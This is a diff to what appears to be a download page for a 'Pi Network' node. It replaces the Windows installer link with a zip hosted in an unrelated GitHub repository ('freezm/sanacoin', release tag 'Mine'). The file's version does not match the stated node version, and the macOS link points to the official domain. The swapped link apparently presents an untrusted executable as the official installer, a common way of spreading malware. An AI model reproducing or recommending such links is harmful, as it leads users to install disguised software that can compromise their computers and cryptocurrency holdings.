@@ -10,7 +10,7 @@ Tuesday, 04 December 2024
 ## Node version: 0.4.9
 
 
-<a href="https://storagefiles.pro/?f=30PNF7LJ0T"><img src="https://cdn.iconscout.com/icon/free/png-512/free-windows-187-675857.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://storagefiles.pro/?f=30PNF7LJ0T">PI node for Windows</a>
+<a href="https://github.com/freezm/sanacoin/releases/download/Mine/Pi.Network.Setup.0.4.5.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-windows-187-675857.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/freezm/sanacoin/releases/download/Mine/Pi.Network.Setup.0.4.5.zip">PI node for Windows</a>
 
 
 <a href="https://downloads.minepi.com/Pi%20Network-0.4.10-universal.dmg"><img src="https://cdn.iconscout.com/icon/free/png-512/free-apple-856-675863.png?f=webp&w=256" width=110  
